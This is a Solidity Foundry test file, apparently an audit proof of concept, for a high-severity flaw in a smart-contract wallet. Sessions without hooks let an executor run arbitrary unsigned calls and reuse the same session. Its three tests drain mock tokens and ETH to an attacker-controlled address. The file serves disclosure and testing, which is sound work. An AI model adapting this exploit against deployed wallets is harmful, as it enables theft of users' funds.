// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.23;

// PoC F1 — HIGH
// Hookless sessions grant executor unrestricted wallet access
//
// Root cause : _getSessionHash() never commits to the `calls` array.
//              onlyValidSession skips preHook when preHook.length < 20.
// Impact     : Any executor holding a hookless session can drain the wallet
//              with arbitrary calls — no restriction is enforced at runtime.
//
// Run: forge test --match-contract PoC_F1 -vvvv

import "forge-std/Test.sol";
import {IExecutor}   from "src/interfaces/IExecutor.sol";
import {IWalletCore} from "src/interfaces/IWalletCore.sol";
import {MockERC20}   from "src/test/MockERC20.sol";
import {MockExecutor} from "src/test/MockExecutor.sol";
import {Call, Session} from "src/Types.sol";
import {DeployInitHelper, DeployFactory} from "scripts/DeployInitHelper.sol";
import {WalletCore}  from "src/WalletCore.sol";
import {ECDSAValidator} from "src/validator/ECDSAValidator.sol";
import {IStorage}    from "src/interfaces/IStorage.sol";

contract PoC_F1 is Test {
    string constant NAME    = "wallet-core";
    string constant VERSION = "1.0.0";

    address internal _alice;
    uint256 internal _alicePk;

    WalletCore     internal _walletCore;
    ECDSAValidator internal _ecdsaValidatorImpl;
    DeployFactory  public   deployFactory;

    MockERC20    token;
    MockExecutor executor;
    address      victim;

    function setUp() public {
        (_alice, _alicePk) = makeAddrAndKey("alice");

        deployFactory = new DeployFactory();
        bytes32 salt  = vm.envBytes32("DEPLOY_FACTORY_SALT");

        (,, address walletAddr) = DeployInitHelper.deployContracts(
            deployFactory, salt, NAME, VERSION
        );
        _walletCore = WalletCore(payable(walletAddr));

        vm.etch(_alice, address(_walletCore).code);
        deal(_alice, 10 ether);
        vm.prank(_alice);
        IWalletCore(_alice).initialize();

        vm.prank(_alice);
        token    = new MockERC20();
        executor = new MockExecutor(IWalletCore(_alice));
        victim   = makeAddr("victim");
    }

    function _sign(Session memory s) internal view returns (Session memory) {
        bytes32 h = IExecutor(_alice).getSessionTypedHash(s);
        (uint8 v, bytes32 r, bytes32 ss) = vm.sign(_alicePk, h);
        s.signature = abi.encodePacked(r, ss, v);
        return s;
    }

    // ------------------------------------------------------------------
    // Test A: drain all ERC20 tokens with arbitrary calls
    // ------------------------------------------------------------------
    function test_f1_hookless_drain_tokens() public {
        uint256 startBal = token.balanceOf(_alice);
        assertGt(startBal, 0);

        // Session has NO hook — calls array is never validated
        Session memory s = _sign(Session({
            id:         0,
            executor:   address(executor),
            validator:  address(1),
            validUntil: block.timestamp + 1000,
            validAfter: 0,
            preHook:    "",   // ← empty, skipped entirely by onlyValidSession
            postHook:   "",
            signature:  ""
        }));

        // Executor submits calls the wallet owner never saw or approved
        Call[] memory calls = new Call[](1);
        calls[0] = Call({
            target: address(token),
            value:  0,
            data:   abi.encodeWithSignature(
                        "transfer(address,uint256)", victim, startBal
                    )
        });

        executor.execute(calls, s);

        assertEq(token.balanceOf(victim), startBal, "F1: victim did not receive tokens");
        assertEq(token.balanceOf(_alice), 0,         "F1: Alice still holds tokens");

        console.log("[F1-A] Tokens drained:", startBal / 1e18);
    }

    // ------------------------------------------------------------------
    // Test B: drain ETH
    // ------------------------------------------------------------------
    function test_f1_hookless_drain_eth() public {
        uint256 startEth = address(_alice).balance;
        assertEq(startEth, 10 ether);

        Session memory s = _sign(Session({
            id:         1,
            executor:   address(executor),
            validator:  address(1),
            validUntil: block.timestamp + 1000,
            validAfter: 0,
            preHook:    "",
            postHook:   "",
            signature:  ""
        }));

        Call[] memory calls = new Call[](1);
        calls[0] = Call({target: victim, value: 10 ether, data: ""});

        executor.execute(calls, s);

        assertEq(address(_alice).balance, 0,         "F1: Alice still has ETH");
        assertEq(address(victim).balance, 10 ether,  "F1: victim did not receive ETH");

        console.log("[F1-B] ETH drained: 10 ether");
    }

    // ------------------------------------------------------------------
    // Test C: same hookless session reused across multiple transactions
    // (no nonce is consumed on the executor path)
    // ------------------------------------------------------------------
    function test_f1_hookless_session_reusable() public {
        deal(address(token), _alice, 200e18);

        Session memory s = _sign(Session({
            id:         2,
            executor:   address(executor),
            validator:  address(1),
            validUntil: block.timestamp + 1000,
            validAfter: 0,
            preHook:    "",
            postHook:   "",
            signature:  ""
        }));

        Call[] memory calls = new Call[](1);
        calls[0] = Call({
            target: address(token),
            value:  0,
            data:   abi.encodeWithSignature(
                        "transfer(address,uint256)", victim, 100e18
                    )
        });

        executor.execute(calls, s);
        assertEq(token.balanceOf(victim), 100e18, "first call failed");

        // Reuse the SAME session — no invalidation occurs
        executor.execute(calls, s);
        assertEq(token.balanceOf(victim), 200e18, "F1: session not reusable");

        console.log("[F1-C] Session reused. Total drained:", token.balanceOf(victim) / 1e18);
    }
}
